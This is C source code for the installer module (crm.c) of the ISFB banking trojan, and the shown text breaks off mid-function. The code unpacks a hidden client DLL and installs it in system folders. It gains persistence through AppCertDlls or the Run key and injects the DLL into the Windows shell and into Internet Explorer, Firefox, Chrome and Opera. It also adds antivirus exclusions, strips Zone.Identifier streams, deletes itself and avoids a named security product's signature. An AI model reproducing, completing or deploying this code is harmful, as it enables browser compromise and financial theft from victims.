//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: crm.c
// $Revision: 456 $
// $Date: 2015-01-24 21:56:51 +0300 (Сб, 24 янв 2015) $
// description:
//	ISFB client installer.
//	This process contains packed client DLL image in resources. When started, it unpacks client DLL, copies it into 
//	one of system folders, registers it within either AppCertDlls key or Windows autorun, and attempts to inject it into the
//	 Windows Shell process and all known browsers.


#include "common\common.h"
#include <shlobj.h>
#include <Tlhelp32.h>

#include "crm.h"
#include "apdepack\depack.h"
#include "acdll\activdll.h"
#include "crypto\crypto.h"
#include "bkinst.h"

HANDLE	g_AppHeap = NULL;		// current DLL heap
ULONG	g_MachineRandSeed = 0;

// Machine level random names
LPTSTR	g_ClientFileName;
LPTSTR	g_StartupValueName;
LPTSTR	g_StartupValueName64;
LPTSTR  g_UpdateEventName = NULL;
LPTSTR  g_ConfigUpdateTimerName = NULL;
LPTSTR	g_DllExportName = NULL;
LPTSTR	g_MainRegistryKey = NULL;



// Inject flags. Used by InjectClient and SetAutoRun functions 
#define	INJECT_FLAG_AUTORUN		0x10	//	Register within Windows autorun

// from bkdrv.c
extern	WINERROR BkExtractDlls(PAD_CONTEXT pAdContext);

// from desktop.c
extern WINERROR SetScrShotAsWallpaperW(LPWSTR	pScrShot, LPWSTR* ppWallpaper);
extern WINERROR SetWallpaperW(LPWSTR pWallpaper);

 // from av.c
 extern BOOL	AvIsVm(VOID);
 extern ULONG	AvGetCursorMovement(VOID);
 extern	WINERROR AvAddMsseExclusion(LPTSTR pFilePath, BOOL bIs64);

 // from uac.c
 extern BOOL UacMain(VOID);

#ifdef _CHECK_VM
 #ifdef _USE_INSTALL_INI
  BOOL	g_bCheckVm = FALSE;
 #else
  #define g_bCheckVm	TRUE
 #endif
#endif	// _CHECK_VM

PVOID __stdcall	AppAlloc(ULONG Size)
{
	return(hAlloc(Size));
}

VOID __stdcall	AppFree(PVOID pMem)
{
	hFree(pMem);
}

PVOID __stdcall	AppRealloc(PVOID pMem, ULONG Size)
{
	return(Realloc(pMem, Size));
}

ULONG __stdcall AppRand(VOID)
{
	return(GetTickCount());
}

//
//	Generates unique module name.
//
static BOOL GenModuleName(
	PULONG		pSeed,	// random seed 
	LPTSTR*		pName,	// receives the buffer with the name generated
	PULONG		pLen	// receives the length of the name in chars
	)
{
	BOOL	Ret = FALSE;
	LPTSTR	ModuleName, SystemDir;
	PWIN32_FIND_DATA FindFileData;
	ULONG	NameLen = 0;
	HANDLE	hFind;

	if (FindFileData = (PWIN32_FIND_DATA)hAlloc(sizeof(WIN32_FIND_DATA)))
	{
		if (SystemDir = (LPTSTR)hAlloc(MAX_PATH_BYTES))
		{
			if (ModuleName = (LPTSTR)hAlloc(DOS_NAME_LEN*sizeof(_TCHAR)))
			{
				memset(ModuleName, 0, DOS_NAME_LEN*sizeof(_TCHAR));
				if (NameLen = GetSystemDirectory(SystemDir, (MAX_PATH - cstrlen(szFindDll) - 1)))
				{
					ULONG i, Steps1, Steps2;
					HANDLE	hFile;
					FILETIME MaxFileTime = {ULONG_MAX, ULONG_MAX};

					// Opening c_1252.nls file and getting it's write time.
					// Thus we can determine a time when OS was installed.
					lstrcat(SystemDir, sz1252nls);
					hFile = CreateFile(SystemDir, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
					if (hFile != INVALID_HANDLE_VALUE)
					{
						GetFileTime(hFile, &MaxFileTime, NULL, NULL);
						((PLARGE_INTEGER)&MaxFileTime)->QuadPart += _SECONDS(60*60*24);
						CloseHandle(hFile);
					}
					SystemDir[NameLen] = 0;
					NameLen = 0;

					// Initializing rand with machine seed value to generate the same name on the same machine
					Steps1 = RtlRandom(pSeed) & 0xff;
					Steps2 = RtlRandom(pSeed) & 0xff;

					lstrcat(SystemDir, szFindDll);
					if ((hFind = FindFirstFile(SystemDir, FindFileData)) != INVALID_HANDLE_VALUE)
					{
						// Cheking files that were modified earlier then MaxFileTime only
						while(CompareFileTime(&FindFileData->ftLastWriteTime, &MaxFileTime) > 0)
						{
							if (!FindNextFile(hFind, FindFileData))
							{
								FindClose(hFind);
								hFind = FindFirstFile(SystemDir, FindFileData);
								MaxFileTime.dwHighDateTime = FindFileData->ftLastWriteTime.dwHighDateTime;
								MaxFileTime.dwLowDateTime = FindFileData->ftLastWriteTime.dwLowDateTime;
							}
						}	// while(CompareFileTime(&FindFileData->ftLastWriteTime, &MaxFileTime) > 0)

						for (i=0; (i<=Steps1 || i<=Steps2); i++)
						{
							if (i == Steps1 || i == Steps2)
							{
								ULONG nLen = (ULONG)(StrChr((LPTSTR)&FindFileData->cFileName,'.') - (LPTSTR)&FindFileData->cFileName);
								ULONG nPos = 0;
								if (NameLen && ((nPos = nLen-4) > nLen))
									nPos = 0;
								if (nLen>4)
									nLen = 4;
								memcpy(ModuleName+NameLen, &FindFileData->cFileName[nPos], nLen*sizeof(_TCHAR));
								NameLen += nLen;
							}	// if (i == Steps1 || i == Steps2)

							do
							{
								if (!FindNextFile(hFind, FindFileData))
								{
									FindClose(hFind);
									hFind = FindFirstFile(SystemDir, FindFileData);
								}	// if (!FindNextFile(hFind, FindFileData))
							} while(CompareFileTime(&FindFileData->ftLastWriteTime, &MaxFileTime) > 0);

						}	// for (i=0; 
						*pName = ModuleName;
						*pLen = NameLen;
						Ret = TRUE;
						FindClose(hFind);
					}	// if ((hFind =
					else
					{
						DbgPrint("ISFB: System file not found: \"%s\"\n", SystemDir);
					}
				}	// if (GetSystemDirectory(

				if (!Ret)
					hFree(ModuleName);
			}	// if (ModuleName =
			hFree(SystemDir);
		}	// if (SystemDir = 
		hFree(FindFileData);
	}	// if (FindFileData = 
	
	return(Ret);
}

static	LPTSTR	MakeRundllCommandLine(
	LPTSTR	pDllPath,
	LPTSTR	pFunction
	)
{
	LPTSTR	pRunCommand = NULL; 
	
	if ((pDllPath) && (pRunCommand = hAlloc((cstrlen(szRunFmt) + lstrlen(pDllPath) + lstrlen(pFunction) + 1) * sizeof(_TCHAR))))
		wsprintf(pRunCommand, szRunFmt, pDllPath, pFunction);

	return(pRunCommand);
}


static BOOL	RunDll(LPTSTR DllPath)
{
	BOOL	Ret = FALSE;
	LPTSTR	AppStr, CmdStr;
	if (AppStr = MakeRundllCommandLine(DllPath, szCreateProcessNotify))
	{
		if (CmdStr = StrChr(AppStr,' '))
		{
			CmdStr[0] = 0;
			CmdStr += 1;

			PsSupDisableWow64Redirection();
			if (PsSupStartExeWithParam(AppStr, CmdStr, SW_SHOWNORMAL) == NO_ERROR)
				Ret = TRUE;
			PsSupEnableWow64Redirection();
		}
		hFree(AppStr);
	}	// if (AppStr = MakeRundllCommandLine(DllPath))
	return(Ret);
}

//
//	Registers specified DLL as AppCertDll or within Windows autorun key, depending on current process permissions.
//
static WINERROR SetAutoRun(
	LPTSTR	FileName,	// Full path to a dll to resister
	ULONG	Flags		// Variuose flags
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	ULONG	FileNameLen, rSize = 0, KeyFlags = KEY_WOW64_32KEY;
	HKEY	hAppCertKey, hKey = 0;
	LPTSTR	StartupValueName, RunCommand = NULL;

	if (Flags & INJECT_ARCH_X64)
	{
		KeyFlags = KEY_WOW64_64KEY;
		StartupValueName = g_StartupValueName64;
	}
	else
		StartupValueName = g_StartupValueName;

	FileNameLen = lstrlen(FileName);

	// Try to remove previously registered autorun value
	Status = RegOpenKeyEx(HKEY_CURRENT_USER, szAutoPath, 0, (KeyFlags | KEY_ALL_ACCESS), &hKey);
	if (Status == NO_ERROR)
		RegDeleteValue(hKey, StartupValueName);

	// Try to register within AppCertDlls first
	Status = RegCreateKeyEx(HKEY_LOCAL_MACHINE, szAppCertDlls, 0, NULL,  0, (KeyFlags | KEY_ALL_ACCESS), NULL, &hAppCertKey, NULL);
	if (Status == NO_ERROR)
	{
		Status = RegSetValueEx(hAppCertKey, StartupValueName, 0, REG_SZ, FileName, (FileNameLen + 1));
		RegCloseKey(hAppCertKey);
	}

	if (Status != NO_ERROR && (!PsSupIsWow64Process(g_CurrentProcessId, 0) || (Flags & INJECT_ARCH_X64)))
	{
		// Registering within AppCertDlls failed, try to register within Windows autorun
		do 
		{
			if (!hKey)
				break;

			if (!(RunCommand = MakeRundllCommandLine(FileName, szCreateProcessNotify)))
				break;

			if ((Status = RegSetValueEx(hKey, StartupValueName, 0, REG_SZ, (BYTE*)RunCommand, (ULONG)(lstrlen(RunCommand) + 1)*sizeof(_TCHAR))) != NO_ERROR)
				break;

			Status = NO_ERROR;

			DbgPrint("ISFB: Client DLL successfully registered within Windows autorun.\n");

		} while (FALSE);

		if (Status == ERROR_UNSUCCESSFULL)
			Status = GetLastError();

		if (RunCommand)
			hFree(RunCommand);
	}
	else
	{
		DbgPrint("ISFB: Client DLL successfully registered as AppCertDll.\n");
	}

	if (hKey)
		RegCloseKey(hKey);

	return(Status);
}


//
//	Writes the specified binary data to the specified file.
//	Removes the specified file before writing (if exists).
//
static WINERROR SaveToFile(
	LPTSTR	FileName,	// Full path to the file.
	PVOID	pData,		// Binary data to write.
	ULONG	DataSize	// Size of the data in bytes.
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	HANDLE	hFile;
	LPTSTR	NewName, pName;

	// Trying to remove the existing file first
	if (NewName = hAlloc((lstrlen(FileName) + 16) * sizeof(_TCHAR)))
	{
		lstrcpy(NewName, FileName);
		if (pName = strrchr(NewName, '\\'))
			pName += 1;
		else
			pName = NewName;
		wsprintf(pName, _T("%u"), GetTickCount());

		// Renaming the existing file
		if (MoveFileEx(FileName, NewName, MOVEFILE_REPLACE_EXISTING))
			// Removing it
			MoveFileEx(NewName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

		hFree(NewName);
	}	// if (NewName = hAlloc((lstrlen(FileName) + 16) * sizeof(_TCHAR)))
		
	hFile = CreateFile(FileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		ULONG bWritten;
		if (WriteFile(hFile, pData, DataSize, &bWritten, NULL))
			Status = NO_ERROR;
		CloseHandle(hFile);
	}

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return(Status);
}

//
//	Attempts to save client DLL into a file.
//  If successfull - allocates and returns a string containing the name of the file.
//  In case of error returns NULL.
//
static LPTSTR SaveClient(
	PVOID	pData,		// pointer to the unpacked client DLL data
	ULONG	Size,
	LPTSTR	ModuleName
	)
{
	LPTSTR	FilePath = NULL;
	ULONG	ModuleNameLen = lstrlen(ModuleName);

	if (FilePath = (LPTSTR)hAlloc(MAX_PATH_BYTES))
	{
		ULONG		bSize;
		WINERROR	Status;

		do 
		{

			// Removed because of Trusteer Rapport signature
/*
			// Try SystemDirectory first
			bSize = GetSystemDirectory(FilePath, MAX_PATH);
			if ((bSize+ModuleNameLen+2) <= MAX_PATH)
			{
				FilePath[bSize] = '\\';
				FilePath[bSize+1] = 0;
				lstrcat(FilePath, ModuleName); 
				Status = SaveToFile(FilePath, pData, Size);
				if (Status == NO_ERROR)
					break;
			}
*/

			// Try Windows directory
			bSize = GetWindowsDirectory(FilePath, MAX_PATH);
			if ((bSize+ModuleNameLen+2) <= MAX_PATH)
			{
				FilePath[bSize] = '\\';
				FilePath[bSize+1] = 0;
				lstrcat(FilePath, ModuleName); 
				Status = SaveToFile(FilePath, pData, Size);
				if (Status == NO_ERROR)
					break;
			}

			// Try current TEMP directory
			bSize = GetTempPath(MAX_PATH, FilePath);
			if ((bSize+ModuleNameLen+1) <= MAX_PATH)
			{
				FilePath[bSize] = 0;
				lstrcat(FilePath, ModuleName); 
				Status = SaveToFile(FilePath, pData, Size);
				if (Status == NO_ERROR)
					break;
			}

			// Try application current directory
			lstrcpy(FilePath, ModuleName);
			Status = SaveToFile(FilePath, pData, Size);
			if (Status == NO_ERROR)
				break;

			hFree(FilePath);
			FilePath = NULL;

		} while (FALSE);
	}	// if (FilePath = 

	return(FilePath);
}


//
//	Enumerate all processes and inject DLL into every browser process.
//
static VOID EnumProcessAndInjectDll(
	LPTSTR	DllPath,
	ULONG	Flags
	)
{
	PROCESSENTRY32	Process = {0};
	HANDLE	hSnapshot;
	
	Process.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		if (Process32First(hSnapshot, &Process))
		{
			do 
			{
				if (Process.th32ProcessID != g_CurrentProcessId)
				{
					ULONG NameHash;
					strupr((LPTSTR)&Process.szExeFile);

					NameHash = (Crc32((LPTSTR)&Process.szExeFile, lstrlen((LPTSTR)&Process.szExeFile)) ^ g_CsCookie);

					if (NameHash == HOST_IE || NameHash == HOST_FF || NameHash == HOST_CR || NameHash == HOST_OP)
					{
						DbgPrint("ISFB: Injecting Client DLL to a predefined host process %s\n", (LPTSTR)&Process.szExeFile);
#if _INJECT_AS_IMAGE
						ProcessInjectDllWithThread(Process.th32ProcessID);
						UNREFERENCED_PARAMETER(DllPath);
						UNREFERENCED_PARAMETER(Flags);
#else
						PsSupInjectDll(Process.th32ProcessID, DllPath, Flags);
#endif
					}
				}	// if (Process.th32ProcessID != g_CurrentProcessId)
			} while (Process32Next(hSnapshot, &Process));
		}	// if (Process32First(hSnapshot, &Process))
		CloseHandle(hSnapshot);
	}	// 	if (hSnapshot != INVALID_HANDLE_VALUE)
}


static BOOL	InjectClient(
	PCHAR	pClient,	// Pointer to the unpacked client DLL data
	ULONG	Size,		// Size of the unpacked data in bytes
	ULONG	Flags		// Variouse flags
	)
{
	BOOL	Ret = FALSE;
	HGLOBAL hRes = 0;
	LPTSTR	ModuleName, DllPath = NULL;
	ULONG	ShellPid;


	do	// not a loop
	{
		if (Flags & INJECT_ARCH_X64)
		{
#ifdef _RANDOM_DLL_NAME
			ModuleName = PsSupNameChangeArch(g_ClientFileName);
#else
			ModuleName = PsSupNameChangeArch(szClientDll);
#endif
			PsSupDisableWow64Redirection();
		}
		else
		{
#ifdef _RANDOM_DLL_NAME
			ModuleName = g_ClientFileName;
#else
			ModuleName = szClientDll;
#endif
		}

		DllPath = SaveClient(pClient, Size, ModuleName);

		if (Flags & INJECT_ARCH_X64)
		{
			PsSupEnableWow64Redirection();
			hFree(ModuleName);
		}

		if (!DllPath)
		{
			DbgPrint("ISFB: Failed to save client DLL.\n");
			break;
		}
		DbgPrint("ISFB: Client DLL saved as %s.\n", DllPath);

#ifdef _MSSE_EXCLUSION
		// Add client path to MSSE exclusion list 
		AvAddMsseExclusion(DllPath, Flags & INJECT_ARCH_X64);
#endif

		if (Flags & INJECT_FLAG_AUTORUN)
		{
			if (SetAutoRun(DllPath, Flags) != NO_ERROR)
			{
				DbgPrint("ISFB: Set auto run failed.\n");
			}
		}	// if (AutoRun)


		if (!(Flags & INJECT_ARCH_X64))
		{
			// Inject into the windows shell process first.
			GetWindowThreadProcessId(GetShellWindow(), &ShellPid);
			PsSupInjectDll(ShellPid, DllPath, Flags);

			// Inject into every browser process running
			EnumProcessAndInjectDll(DllPath, Flags);
		}
		else
			// Starting 64-bit DLL
			RunDll(DllPath);			
	
		Ret = TRUE;
	} while(FALSE);

	if (DllPath)
		hFree(DllPath);

	return(Ret);
}



//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Attempts to unload the client-DLL from all existing processes.
//  This function is used for compatibility with old ISFB versions those do not support dll update.
//
static BOOL	UnloadAll(LPTSTR DllPath)
{
	BOOL	Ret = FALSE;
	PROCESSENTRY32	Process = {0};
	HANDLE	hSnapshot;

	// Enumerate all processes and unload from every process.
	Process.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		if (Process32First(hSnapshot, &Process))
		{
			Ret = TRUE;
			do 
			{	
				if (PsSupUnloadDll(Process.th32ProcessID, DllPath, 0) == NO_ERROR)
				{
					DbgPrint("ISFB: Client DLL \"%s\" successfully unloaded from process 0x%x.\n", DllPath, Process.th32ProcessID);
				}
			} while (Process32Next(hSnapshot, &Process));
		}
		CloseHandle(hSnapshot);
	}	// 	if (hSnapshot != INVALID_HANDLE_VALUE)

	return(Ret);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches the specified CmdLine for pare: " ParamStr ParamData". If found, copies ParamData into specified string.
//
static BOOL CmdLineParam(
			IN	LPTSTR CmdLine,			// Command line string 
			IN	LPTSTR ParamStr,		// Reqired parameter name string
			OUT	LPTSTR ParamData,		// String to receive parameter value 
			IN OUT PULONG DataLen		// Length of the string in chars including 0
			)
{
	BOOL Ret = FALSE;

	LPTSTR	UprCmdLine = (LPTSTR)hAlloc((lstrlen(CmdLine)+1)*sizeof(_TCHAR)); // 1 char for 0
	if (UprCmdLine)
	{
		LPTSTR  Param;

		lstrcpy(UprCmdLine, CmdLine);
		UprCmdLine = _strupr(UprCmdLine);

		if (Param = StrStrI(UprCmdLine, ParamStr))
		{
			ULONG cLen = 0;

			Param += lstrlen(ParamStr);
			while (Param[0] == 32)	// " "
				Param += 1;

		
			while ((Param[cLen] != 0) && (Param[cLen] != 32) && (cLen < *DataLen))
			{
				ParamData[cLen] = Param[cLen];
				cLen += 1;
			}

			if (cLen != 0 && cLen < *DataLen)
			{
				ParamData[cLen] = 0;
				*DataLen = cLen;
				Ret = TRUE;
			}
		}

		hFree(UprCmdLine);
	}

	return(Ret);
}


//
//	Terminates the specified process.
//
static BOOL StopProcess(
	ULONG	Pid		// ID of the process to terminate.
	)
{
	BOOL Ret = FALSE;
	HANDLE hProcess;

	if (hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, Pid))
	{
		TerminateProcess(hProcess, 0);
		if (WaitForSingleObject(hProcess, 5000) == WAIT_OBJECT_0)
			Ret = TRUE;
			
		CloseHandle(hProcess);
	}

	if (Ret)
	{
		DbgPrint("ISFB: Process 0x%x stopped successfully.\n", Pid);
	}
	else
	{
		DbgPrint("ISFB: Failed to stop process 0x%x.\n", Pid);
	}

	return(Ret);
}



//
//	Generates machine-specific pseudo random names.
//
static BOOL GenMachineLevelNames(VOID)
{
	BOOL Ret = FALSE;
	ULONG	cLen;
	ULONG	NameSeed, GuidSeed;
	LPTSTR	ConfigUpdateMutexName = NULL;

	DbgPrint("ISFB: Generating machine-level names from seed 0x%08x\n", g_MachineRandSeed);

	NameSeed = GuidSeed = g_MachineRandSeed;

	do // not a loop
	{
		if (!GenModuleName(&NameSeed, &g_StartupValueName, &cLen))
		{
			DbgPrint("ISFB: Failed generating main module name.\n");
			break;
		}

		if (!GenModuleName(&NameSeed, &g_ClientFileName, &cLen))
		{
			DbgPrint("ISFB: Failed generating client dll module name.\n");
			break;
		}
#if (defined(_EXE_LOADER) && !defined(_DLL_INSTALLER))
		lstrcat(g_ClientFileName, szExtExe);
#else
		lstrcat(g_ClientFileName, szExtDll);
#endif

		if (!GenModuleName(&NameSeed, &g_StartupValueName64, &cLen))
		{
			DbgPrint("ISFB: Failed generating 64-bit module name.\n");
			break;
		}

		// Main registry key name, we don't really need it here.
		if (!(g_MainRegistryKey = GenGuidName(&GuidSeed, szDataRegSubkey, NULL, FALSE)))
			break;
		
		// Randomizing DLL-specific GUID values
		GuidSeed ^= uDllSeed;

		// Update event name
		if (!(g_UpdateEventName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// Config update mutex name, we don't really need it here.
		if (!(ConfigUpdateMutexName = GenGuidName(&GuidSeed, NULL, NULL, TRUE)))
			break;

		// Config update timer name
		if (!(g_ConfigUpdateTimerName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))
			break;

		// Random DLL exported function name
		GuidSeed = GetTickCount();
		if (!GenModuleName(&GuidSeed, &g_DllExportName, &cLen))
		{
			DbgPrint("ISFB: Failed generating client dll export name.\n");
			break;
		}

#if _DISPLAY_NAMES		
		DbgPrint("ISFB: 32-bit startup value name is %s.\n", g_StartupValueName);
		DbgPrint("ISFB: 32-bit client dll module name is %s.\n", g_ClientFileName);
		DbgPrint("ISFB: 64-bit startup value name is %s.\n", g_StartupValueName64);
		DbgPrint("ISFB: Update event name is %s.\n", g_UpdateEventName);
		DbgPrint("ISFB: Config update mutex name is %s.\n", ConfigUpdateMutexName);
		DbgPrint("ISFB: Config update timer name is %s.\n", g_ConfigUpdateTimerName);
#endif
	

		Ret = TRUE;
	} while(FALSE);

	if (ConfigUpdateMutexName)
		hFree(ConfigUpdateMutexName);

	return(Ret);
}


//
//	Processes command line parameters if any.
//
static VOID CheckProcessParameters(
	LPTSTR CmdLine	// Command line with parameters.
	)
{
	ULONG	UpdLen = MAX_PATH;
	LPTSTR	UpdStr = (LPTSTR)hAlloc(MAX_PATH_BYTES);	
	LPTSTR  ParamStr = NULL;

	// Check out the parameter string 
	if (UpdStr)
	{
		if (CmdLineParam(CmdLine, szUpd, UpdStr, &UpdLen))
		{
			// if "/UPD" parameter specified, try to update the process with specified ID
			ULONG ProcessId = _tcstoul(UpdStr, NULL, 0);
			if (ProcessId)
			{
				DbgPrint("ISFB: /UPD parameter found, attemting to update process 0x%x\n", ProcessId);

				do	// not a loop
				{
					if (!PsSupGetProcessPathById(ProcessId, UpdStr, MAX_PATH))
						break;
					DbgPrint("ISFB: Target file to update is: %s.\n", UpdStr);

					DbgPrint("ISFB: Current file path is: %s.\n", g_CurrentModulePath);
				
					if (!StopProcess(ProcessId))
						break;
					DbgPrint("ISFB: Process 0x%x terminated.\n", ProcessId);

					if (!CopyFile(g_CurrentModulePath, UpdStr, FALSE))
						break;
					DbgPrint("ISFB: New file copied to target.\n");

					if (ParamStr = (LPTSTR)hAlloc(MAX_PATH))
					{
						wsprintf(ParamStr, szLdrSdFmt, g_CurrentProcessId);
						if (PsSupStartExeWithParam(UpdStr, ParamStr, SW_SHOWNORMAL) == NO_ERROR)
						{
							DbgPrint("ISFB: Update complete. Waiting for process to terminate.\n");
							do 
							{
								SleepEx(5000, TRUE);
							} while(TRUE);
						}
						hFree(ParamStr);
					}
				} while(FALSE);
			}	// if (ProcessId)
		}

		if (CmdLineParam(CmdLine, szSd, UpdStr, &UpdLen))
		{
			// /SD parameter specified. Stop and delete specified process.
			ULONG ProcessId = _tcstoul(UpdStr, NULL, 0);
			if (ProcessId)
			{
				DbgPrint("ISFB: /SD parameter found, attemting to stop and delete process 0x%x\n", ProcessId);

				do	// not a loop
				{
					if (!PsSupGetProcessPathById(ProcessId, UpdStr, MAX_PATH))
						break;
					DbgPrint("ISFB: Target file to delete is: %s.\n", UpdStr);

					if (StopProcess(ProcessId))
					{
						DbgPrint("ISFB: Process 0x%x terminated.\n", ProcessId);
					}

					if (!DeleteFile(UpdStr))
						break;
					DbgPrint("ISFB: Process file deleted.\n");
				} while(FALSE);

			}	// if (ProcessId)
		}
		hFree(UpdStr);
	}	// if (UpdStr)

}


//
//	Creates a BAT file that attemts to delete this module in infinite loop.
//	Then this BAT file deletes itself.
//
static VOID DoSelfDelete(VOID)
{
	if (g_CurrentModulePath)
		PsSupDeleteFileWithBat(g_CurrentModulePath);
}


//
//	Searches the resource with the specified name within the current image resources.
//	Loads the resource found, unpacks it and tries to install as client DLL.
//
static BOOL InstallClientRsrc(
	LPTSTR	ClientName,
	ULONG	Flags
	)
{
	HRSRC	hResource;
	HGLOBAL	hRes;
	BOOL	Ret = FALSE;

	Flags |= INJECT_FLAG_AUTORUN;

	// Looking for the specified client resource
	if (hResource = FindResource(g_CurrentModule, ClientName, RT_RCDATA))
	{
		// Loading the resource
		if (hRes = LoadResource(g_CurrentModule, hResource))
		{
			// Unpacking the resource data
			PAP_FILE_HEADER pHeader = (PAP_FILE_HEADER)LockResource(hRes);
			PCHAR	Packed = (PCHAR)pHeader + pHeader->HeaderSize;
			PVOID	Unpacked = (PVOID)hAlloc(pHeader->OriginalSize);
			if (Unpacked)
			{
				if (aP_depack(Packed, Unpacked) == pHeader->OriginalSize)
					// Installing the DLL
					Ret = InjectClient(Unpacked, pHeader->OriginalSize, Flags);

				hFree(Unpacked);
			}	// if (Unpacked)
		}	// if (hRes = LoadResource(NULL, hResource))
	}	// if (hResource = FindResource(NULL, ClientName, RT_RCDATA))
	else
	{
		DbgPrint("ISFB: Client resource \"%s\" not found.\n", ClientName);
	}

	return(Ret);
}


//
//	Searches the client DLL data with the specified name within the current image joined files.
//	Unpacks the found data and tries to install as client DLL.
//
static BOOL InstallClientFj(
	ULONG	ClientId,
	ULONG	Flags
	)
{
	BOOL	Ret = FALSE;
	PCHAR	pData;
	ULONG	Size;

	Flags |= INJECT_FLAG_AUTORUN;

	if (GetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, &pData, &Size, (Flags & INJECT_ARCH_X64), ClientId, 0))
	{
		Ret = InjectClient(pData, Size, Flags);
		hFree(pData);
	}
	else
	{
		DbgPrint("ISFB: Joined client ID 0x%x not found.\n", ClientId);
	}

	return(Ret);

}


#ifdef _REGISTER_EXE

//
//	Attempts to copy the specified file into one of the system-specific folders.
//	Returns new fiel path if successfull.
//
static LPTSTR SaveApp(
	LPTSTR	SourcePath,	// source file path
	LPTSTR	ModuleName,	// new file name
	PCHAR	pFileData,
	ULONG	FileSize
	)
{
	LPTSTR	FilePath = NULL;
	ULONG	NameLen = lstrlen(ModuleName);

	if (FilePath = hAlloc((MAX_PATH + cstrlen(szZoneIdentifier) + 1) * sizeof(_TCHAR)))
	{
		ULONG bSize;

		do 
		{
			// Try SystemDirectory first
			bSize = GetSystemDirectory(FilePath, MAX_PATH);
			if ((bSize + NameLen + 2) <= MAX_PATH)
			{
				PathCombine(FilePath, FilePath, ModuleName);

				if (
					CopyFile(SourcePath, FilePath, FALSE))
				{
					g_CurrentProcessFlags |= GF_ADMIN_PROCESS;
					break;
				}
			}

			// Try Windows directory
			bSize = GetWindowsDirectory(FilePath, MAX_PATH);
			if ((bSize + NameLen + 2) <= MAX_PATH)
			{
				PathCombine(FilePath, FilePath, ModuleName);
				if (
					CopyFile(SourcePath, FilePath, FALSE))

				{
					g_CurrentProcessFlags |= GF_ADMIN_PROCESS;
					break;
				}
			}

			// Try current TEMP directory
			bSize = GetTempPath(MAX_PATH, FilePath);
			if ((bSize + NameLen + 1) <= MAX_PATH)
			{
				PathCombine(FilePath, FilePath, ModuleName);
				if (
					CopyFile(SourcePath, FilePath, FALSE))
					break;
			}

			// Try application current directory
			lstrcpy(FilePath, ModuleName);
			if (
				CopyFile(SourcePath, FilePath, FALSE))
				break;

			hFree(FilePath);
			FilePath = NULL;
		} while (FALSE);
	}	// if (FilePath =

	if (FilePath)
	{
		DbgPrint("ISFB: The installer saved as \"%s\"\n", FilePath);

		// Deleting "Zone.Identifier" stream to avoid "Unknown publisher" message when started
		NameLen = lstrlen(FilePath);
		lstrcat(FilePath, szZoneIdentifier);
		DeleteFile(FilePath);
		FilePath[NameLen] = 0;
	}

	return(FilePath);
}

static BOOL IsInstalled(
	ULONG	Flags
	)
{
	BOOL	bRet = FALSE;
	HKEY	hKey;
	ULONG	Size, Type = REG_SZ, KeyFlags = KEY_WOW64_32KEY;
	LPTSTR	RegFilePath, pRunCommand = NULL;

	if (Flags & INJECT_ARCH_X64)
		KeyFlags = KEY_WOW64_64KEY;

#ifdef _DLL_INSTALLER
	pRunCommand = MakeRundllCommandLine(g_CurrentModulePath, szDllEntryPoint);
#else
	pRunCommand = g_CurrentModulePath;
#endif
	if (pRunCommand)
	{
		// Check if this file already installed within Windows autorun

		ASSERT(g_CurrentModulePath);

		if (RegOpenKeyEx(HKEY_CURRENT_USER, szAutoPath, 0, (KeyFlags | KEY_ALL_ACCESS), &hKey) == NO_ERROR)
		{
			Size = (lstrlen(pRunCommand) + 1) * sizeof(_TCHAR);
			ASSERT(Size);
			if (RegFilePath = hAlloc(Size))
			{
				if (RegQueryValueEx(hKey, g_StartupValueName, 0, &Type, RegFilePath, &Size) == NO_ERROR)
				{
					RegFilePath[(Size / sizeof(_TCHAR)) - 1] = 0;
					if (!lstrcmpi(RegFilePath, pRunCommand))
						bRet = TRUE;
				}
				hFree(RegFilePath);
			}	// if (RegFilePath = hAlloc(Size))

			RegCloseKey(hKey);
		}	// if (Status == NO_ERROR)

		if (pRunCommand != g_CurrentModulePath)
			hFree(pRunCommand);
	}	// if (pRunCommand)

	return(bRet);
}


//
//	Copies current program file into one of the system folders and registers it within Windows autorun.
//
static BOOL InstallApp(
	ULONG	Flags
	)
{
	BOOL	Ret = TRUE;
	HKEY	hKey;
	ULONG	Size, Type = REG_SZ, KeyFlags = KEY_WOW64_32KEY;
	LPTSTR	RegFilePath, pRunCommand = NULL;
	WINERROR Status;

	PCHAR	pFileData = NULL;
	ULONG	FileSize = 0;

	if (Flags & INJECT_ARCH_X64)
		KeyFlags = KEY_WOW64_64KEY;
	
#ifdef _DLL_INSTALLER
	pRunCommand = MakeRundllCommandLine(g_CurrentModulePath, szDllEntryPoint);
#else
	pRunCommand = g_CurrentModulePath;
#endif
	if (pRunCommand)
	{
		ASSERT(g_CurrentModulePath);
		DbgPrint("ISFB: Run command is \"%s\"\n", pRunCommand);

		Status = RegOpenKeyEx(HKEY_CURRENT_USER, szAutoPath, 0, (KeyFlags | KEY_ALL_ACCESS), &hKey);
		if (Status == NO_ERROR)
		{
			// Check if this file already installed within Windows autorun
			Size = (lstrlen(pRunCommand) + 1) * sizeof(_TCHAR);
			ASSERT(Size);
			if (RegFilePath = hAlloc(Size))
			{
				Status = RegQueryValueEx(hKey, g_StartupValueName, 0, &Type, RegFilePath, &Size);
